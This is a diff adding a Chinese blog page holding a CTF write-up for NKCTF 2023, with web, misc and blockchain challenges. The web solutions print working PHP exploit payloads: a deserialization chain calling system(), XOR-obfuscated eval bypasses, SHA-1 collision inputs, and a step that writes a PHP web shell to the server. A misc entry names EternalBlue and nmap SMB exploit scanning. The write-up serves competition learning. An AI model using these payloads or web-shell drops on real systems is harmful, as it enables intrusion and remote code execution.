@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 5.4.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.lug.ustc.edu.cn/css2?family=Lato:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"liu1272.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"copycode":{"enable":true,"style":"flat"},"fold":{"enable":true,"height":300},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":50,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/config.min.js"></script>
+
+    <meta name="description" content="前话这次CTF比赛对我来说难度感觉适中偏难吧，很多题都是可以写的只是因为比赛是团队合作，所以就把难题留给大哥们了。当然，这不是重点，重点是从中学到了啥。 WriteUpWebBabyPHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NKCTF2023WP">
+<meta property="og:url" content="https://liu1272.github.io/2023/03/27/NKCTF2023WP/index.html">
+<meta property="og:site_name" content="Robin">
+<meta property="og:description" content="前话这次CTF比赛对我来说难度感觉适中偏难吧，很多题都是可以写的只是因为比赛是团队合作，所以就把难题留给大哥们了。当然，这不是重点，重点是从中学到了啥。 WriteUpWebBabyPHP">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-27T15:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-27T17:23:36.000Z">
+<meta property="article:author" content="Shunyu">
+<meta property="article:tag" content="日报">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://liu1272.github.io/2023/03/27/NKCTF2023WP/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://liu1272.github.io/2023/03/27/NKCTF2023WP/","path":"2023/03/27/NKCTF2023WP/","title":"NKCTF2023WP"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>NKCTF2023WP | Robin</title>
+  
+
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/analytics/baidu-analytics.min.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?[object Object]"></script>
+
+  <script async src="//assets.growingio.com/2.1/gio.js"></script>
+  <script class="next-config" data-name="growingio_analytics" type="application/json">{"enable":false}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/analytics/growingio.min.js"></script>
+
+  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{&quot;token&quot;: &quot;[object Object]&quot;}'></script>
+
+  <script>
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "[object Object]");
+</script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Robin" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Robin</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">LiuGuobin's blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">8</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">111</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E8%AF%9D"><span class="nav-number">1.</span> <span class="nav-text">前话</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WriteUp"><span class="nav-number"></span> <span class="nav-text">WriteUp</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MISC"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE"><span class="nav-number">3.</span> <span class="nav-text">区块链</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%80%E5%90%8E"><span class="nav-number"></span> <span class="nav-text">最后</span></a></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Shunyu"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Shunyu</p>
+  <div class="site-description" itemprop="description">Welcome</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">111</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/liu1272" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;liu1272" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1265257855@qq.com" title="E-Mail → mailto:1265257855@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://liu1272.github.io/2023/03/27/NKCTF2023WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Shunyu">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Robin">
+      <meta itemprop="description" content="Welcome">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="NKCTF2023WP | Robin">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NKCTF2023WP
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-03-27 23:00:00" itemprop="dateCreated datePublished" datetime="2023-03-27T23:00:00+08:00">2023-03-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-28 01:23:36" itemprop="dateModified" datetime="2023-03-28T01:23:36+08:00">2023-03-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%97%A5%E6%8A%A5/" itemprop="url" rel="index"><span itemprop="name">日报</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span id="/2023/03/27/NKCTF2023WP/" class="post-meta-item leancloud_visitors" data-flag-title="NKCTF2023WP" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.6k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>6 分钟</span>
+    </span>
+</div>
+
+
+          # 置顶图标
+          
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h5 id="前话"><a href="#前话" class="headerlink" title="前话"></a>前话</h5><p>这次CTF比赛对我来说难度感觉适中偏难吧，很多题都是可以写的<br>只是因为比赛是团队合作，所以就把难题留给大哥们了。<br>当然，这不是重点，重点是从中学到了啥。</p>
+<h4 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h4><h5 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h5><p><strong>BabyPHP</strong></p>
+<pre><code>&lt;?php
+    error_reporting(0);
+    class Welcome&#123;
+        public $name;
+        public $arg = &#39;oww!man!!&#39;;
+        public function __construct()&#123;
+            $this-&gt;name = &#39;ItS SO CREAZY&#39;;
+        &#125;
+        public function __destruct()&#123;
+            if($this-&gt;name == &#39;welcome_to_NKCTF&#39;)&#123;
+                echo $this-&gt;arg;
+            &#125;
+        &#125;
+    &#125;
+
+    function waf($string)&#123;
+        if(preg_match(&#39;/f|l|a|g|\*|\?/i&#39;, $string))&#123;
+            die(&quot;you are bad&quot;);
+        &#125;
+    &#125;
+    class Happy&#123;
+        public $shell;
+        public $cmd;
+        public function __invoke()&#123;
+            $shell = $this-&gt;shell;
+            $cmd = $this-&gt;cmd;
+            waf($cmd);
+            eval($shell($cmd));
+        &#125;
+    &#125;
+    class Hell0&#123;
+        public $func;
+        public function __toString()&#123;
+            $function = $this-&gt;func;
+            $function();
+        &#125;
+    &#125;
+
+    if(isset($_GET[&#39;p&#39;]))&#123;
+        unserialize($_GET[&#39;p&#39;]);
+    &#125;else&#123;
+        highlight_file(__FILE__);
+    &#125;
+?&gt;
+
+
+进行反序列化
+
+
+&lt;?php
+error_reporting(0);
+
+class Welcome
+&#123;
+    public $name;
+    public $arg;
+
+    public function __construct()
+    &#123;
+        $this-&gt;name = new Hell0();
+    &#125;
+&#125;
+
+function waf($string)
+&#123;
+    if (preg_match(&#39;/f|l|a|g|\*|\?/i&#39;, $string)) &#123;
+        die(&quot;you are bad&quot;);
+    &#125;
+&#125;
+
+class Happy
+&#123;
+    public $shell;
+    public $cmd;
+
+    public function __construct()
+    &#123;
+        $this-&gt;shell = &#39;system&#39;;
+        // flag*?
+        $this-&gt;cmd = &#39;cd /;more `php -r &quot;echo chr(102).chr(49).chr(97).chr(103);&quot;`&#39;;
+    &#125;
+
+    public function __invoke()
+    &#123;
+        $shell = $this-&gt;shell;
+        $cmd = $this-&gt;cmd;
+        waf($cmd);
+        eval($shell($cmd));
+    &#125;
+&#125;
+
+class Hell0
+&#123;
+    public $func;
+
+    public function __construct()
+    &#123;
+        $this-&gt;func = new Happy();
+    &#125;
+&#125;
+
+$a = new Welcome();
+echo urlencode(serialize($a));
+</code></pre>
+<p><strong>EazyPHP</strong></p>
+<pre><code>&lt;?php 
+    highlight_file(__FILE__);
+    error_reporting(0);
+    if($_GET[&#39;a&#39;] != $_GET[&#39;b&#39;] &amp;&amp; md5($_GET[&#39;a&#39;]) == md5($_GET[&#39;b&#39;]))&#123;
+        if((string)$_POST[&#39;c&#39;] != (string)$_POST[&#39;d&#39;] &amp;&amp; sha1($_POST[&#39;c&#39;]) === sha1($_POST[&#39;d&#39;]))&#123;
+            if($_GET[&#39;e&#39;] != 114514 &amp;&amp; intval($_GET[&#39;e&#39;]) == 114514)&#123;
+                if(isset($_GET[&#39;NS_CTF.go&#39;]))&#123;
+                    if(isset($_POST[&#39;cmd&#39;]))&#123;
+                        if(!preg_match(&#39;/[0-9a-zA-Z]/i&#39;, $_POST[&#39;cmd&#39;]))&#123;
+                            eval($_POST[&#39;cmd&#39;]);
+                        &#125;else&#123;
+                            die(&#39;error!!!!!!&#39;);
+                        &#125;
+                    &#125;else&#123;
+                        die(&#39;error!!!!!&#39;);
+                    &#125;
+                &#125;else&#123;
+                    die(&#39;error!!!!&#39;);
+                &#125;
+            &#125;else&#123;
+                die(&#39;error!!!&#39;);
+            &#125;
+        &#125;else&#123;
+            die(&#39;error!!&#39;);
+        &#125;
+    &#125;else&#123;
+        die(&#39;error!&#39;);
+    &#125;
+?&gt; error!
+
+
+其中使用[]通配符绕过
+
+
+c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;cmd=(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%00%06%00&quot;^&quot;%60%60%60%20%2f%60%2a&quot;);
+</code></pre>
+<p><strong>HardPHP</strong></p>
+<pre><code>&lt;?php
+// not only ++
+error_reporting(0);
+highlight_file(__FILE__);
+
+if (isset($_POST[&#39;NKCTF&#39;])) &#123;
+    $NK = $_POST[&#39;NKCTF&#39;];
+    if (is_string($NK)) &#123;
+        if (!preg_match(&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;,$NK) &amp;&amp; strlen($NK) &lt; 105)&#123;
+            eval($NK);
+        &#125;else&#123;
+            echo(&quot;hacker!!!&quot;);
+        &#125;
+    &#125;else&#123;
+        phpinfo();
+    &#125;
+&#125;
+?&gt;
+
+
+【1】利用自增方法
+NKCTF=$_=(_/_._)[&#39;$&#39;==&#39;_&#39;];$_++;$__=$_.$_++;$_++;$_++;$_++;$__.=$_;$_++;$_=_.$__.$_;$$_[_]($$_[__]);&amp;_=readfile&amp;__=/flag
+
+【2】先传Shell
+NKCTF=%24_%3D(_%2F_._)%5B___%5D%3B%24__%3D%2B%2B%24_%3B%24_____%3D%2B%2B%24_.%24__%3B%2B%2B%24_%2F%2B%2B%24_%3B%24_%3D_.%24_____.%3D%2B%2B%24_.%2B%2B%24_%3B%24%24_%5B___%5D(%24%24_%5B_%5D)%3B&amp;___=shell_exec&amp;_=echo &#39;&lt;?php eval($_POST[1])?&gt;&#39; &gt;1.php
+     再输出FLAG
+1=echo file_get_contents(&#39;/flag&#39;);
+</code></pre>
+<p><strong>EasyPMS</strong></p>
+<pre><code>禅道系统存在命令执行和权限绕过漏洞，根据0Day漏洞的POC执行就行了
+</code></pre>
+<h5 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h5><p><strong>Blue取证磁盘</strong></p>
+<pre><code>【预期解】
+使用永恒之蓝攻击
+
+【非预期解】
+虚拟机直接导入
+先扫出IP地址
+使用nmap尝试扫描其他smb漏洞      nmap -P --script=smb-vuln*  IP
+利用ms09的CVE
+获取Shell然后打开
+
+【严重非预期解】
+WinHex一把嗦
+</code></pre>
+<p><strong>三体</strong><br><a href="https://www.bilibili.com/video/BV1Ai4y1V7rg/">老题目了</a></p>
+<pre><code>from PIL import Image
+
+def decode(im):
+    width, height = im.size
+    lst = [ ]
+    for y in range(height):
+        for x in range(width):
+            red, green, blue = im.getpixel((x, y))
+            if (blue | green | red) == 0:
+                break
+            
+            index = (green &lt;&lt; 8) + blue
+            lst.append( chr(index) )
+
+    return &#39;&#39;.join(lst)
+
+
+def main(filename: str):
+    all_text = decode(Image.open(filename))
+    with open(&quot;&#123;&#125;_decode.txt&quot;.format(&#39;.&#39;.join(filename.split(&#39;.&#39;)[:-1])), &quot;w&quot;, encoding = &quot;utf-8&quot;) as f:
+        f.write(all_text)
+
+if __name__ == &#39;__main__&#39;:
+    main(&#39;三体.bmp&#39;)
+</code></pre>
+<p><strong>THMaster东方星莲船打到10亿分</strong></p>
+<pre><code>【1】简简单单网上找修改器改分数
+【2】CheatEngine修改游戏数据
+</code></pre>
+<p><strong>easy_rgb</strong></p>
+<pre><code>用Kali的工具gaps
+具体指令自己网上找
+
+然后发现三个文档
+r.txt   g.txt   b.txt
+
+按照rgb的顺序每次读一位字符得到压缩包字节流
+r = &quot;5b04000d663f400000006c6e747a434fbc7d0225c4060b2905cf0a280807372873460041100000ba56b200000000000000006c6e7400000110ea63055a596785d14500010000600745213&quot;
+g = &quot;0040000ba56b2000000066778f4ac280276f9fb28fb3c282b4fdf7d8a0944bc722bd65b0410083a5492004008200000000006677800000008cc73d1c7630a5f595b000001500800015d38&quot;
+b = &quot;4310083a54920040080061247309bcac200235fff7778acdfc0401090b3a37c1fcf3000204000d663f40000004000020000061247a20000004dd5985a5d14663000600000a0000004332&quot;
+data = &quot;&quot;
+for i in range(len(r)):
+    try:
+        data += r[i] + g[i] + b[i]
+    except:
+        break
+data += r[-1] + g[-1]
+with open(&#39;flag.zip&#39;, &#39;wb&#39;) as f:
+    f.write(bytes.fromhex(data))
+</code></pre>
+<p><strong>easy_word</strong></p>
+<pre><code>提示如下:
+小明这个笨蛋，给文档设置了一个密码，但是他自己却忘记了密码，他知道以下信息：
+1.密码是数学和大小写英语的随机生成的
+2.hash函数：
+输出大小 256 bits 内部大小 256 区块大小    512 长度大小 64 字符尺寸 32
+3.密码：h??vO??0 (?号部分为小明已经忘记的位置)
+  哈希：b75d1224 ... (后面不记得了...)
+
+写脚本跑一下
+import hashlib
+chars = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
+for c1 in chars:
+    for c2 in chars:
+        for c3 in chars:
+            for c4 in chars:
+                password = &quot;h&#123;&#125;&#123;&#125;vO&#123;&#125;&#123;&#125;0&quot;.format(c1, c2, c3, c4)
+                hashcode = hashlib.sha256(password.encode()).hexdigest()
+                if hashcode[:8] == &quot;b75d1224&quot;:
+                    print(&quot;&#123;&#125;   &#123;&#125;&quot;.format(password, hashcode))
+                    
+h4evOF90   b75d1224d1321f5acfe0fb499ff02ab0f15d199e227c77c84c1162340bc6c771
+发现有一个图片
+猜测是LSB，直接解密
+</code></pre>
+<p><strong>first_spam_of_rabbit_year</strong></p>
+<pre><code>文档底下的社会主义核心价值观编码解码为：rabbit 又 move
+再用佛又曰得出的文本有不可显示字符
+零宽解密   https://offdev.net/demos/zwsp-steg-js
+将key和密文清除零宽后分别解密得到新密文
+最后用rabbit解密   https://www.codeeeee.com/encrypt/rabbit.html
+</code></pre>
+<p><strong>easy_bmp</strong></p>
+<pre><code>修改宽并使用脚本爆破高显示出部分key
+解压出一个二维码扫得flag
+</code></pre>
+<p><strong>baby_music</strong></p>
+<pre><code>WinHex打开发现全是1027和1127
+盲猜是二进制数据，把1027改为0,1127改为1
+得到一个zip，里面有脚本
+压缩包的提示为摩斯密码
+猜测明文攻击 echo -n &quot;89504E470D0A1A0A0000000D49484452&quot; | xxd -r -ps &gt; png_header
+</code></pre>
+<p><strong>easymusic</strong></p>
+<pre><code>提示OpenPuff，需要三个密码
+用notepad++打开音频文件发现第一个密码
+Kali安装Audacity选择spectrogram进行频谱分析得到一个密码
+选择波形分析，发现对应二进制的01变化，高电平表示1，低电平表示0，二进制数转换成字符串得到第三个密码
+最后提取出隐藏Flag
+</code></pre>
+<p><strong>easy_pic</strong></p>
+<pre><code>formast分离出一个图片
+010编辑器分析出隐藏数据得到一个照片
+PS更改宽高得到隐藏Flag
+</code></pre>
+<h5 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h5><p><strong>Signin</strong><br>不会。</p>
+<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>反正感觉这次比赛还是有很大作用的，以后继续努力（敷衍中，睡觉了）</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="Shunyu 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="Shunyu 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%97%A5%E6%8A%A5/" rel="tag"><i class="fa fa-tag"></i> 日报</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/03/21/%E8%AF%B4%E7%82%B9%E5%95%A5%E5%A5%BD%E5%91%A2%EF%BC%9F/" rel="prev" title="说点啥好呢？">
+                  <i class="fa fa-angle-left"></i> 说点啥好呢？
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/04/07/CTFshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="next" title="CTFshow刷题记录">
+                  CTFshow刷题记录 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments" id="valine-comments"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Shunyu</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">157k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">9:31</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
